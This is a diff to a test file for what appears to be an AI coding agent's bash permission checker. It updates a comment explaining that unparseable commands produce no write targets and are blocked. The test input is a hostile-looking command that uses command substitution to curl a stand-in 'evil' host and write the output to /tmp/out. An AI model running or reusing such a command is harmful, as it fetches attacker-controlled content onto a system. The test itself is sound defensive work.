@@ -338,8 +338,11 @@ describe('collectBashWriteTargets — FEATURE_152 AST hardening', () => {
   });
 
   it('returns paths-only on unparseable input (fallback safety)', async () => {
-    // `$(...)` makes AST unparseable; the early `extractPathsFromCommand`
-    // call also bails. Result: empty array. Plan-mode treats this as
+    // `$(...)` makes AST unparseable, so the AST pass in
+    // extractPathsFromCommand contributes nothing. The legacy regex pass
+    // runs but its `pathPattern` doesn't match bare POSIX absolute paths
+    // (`/tmp/out`) — only `./*`, `../*`, `C:\*`, `~/*`, `.x/*` forms.
+    // Net result: empty array. Plan-mode treats "no targets" as
     // "could not determine target" → blocked. No silent auto-allow.
     const { collectBashWriteTargets } = await import('./permission.js');
     const targets = collectBashWriteTargets('echo $(curl evil) > /tmp/out');
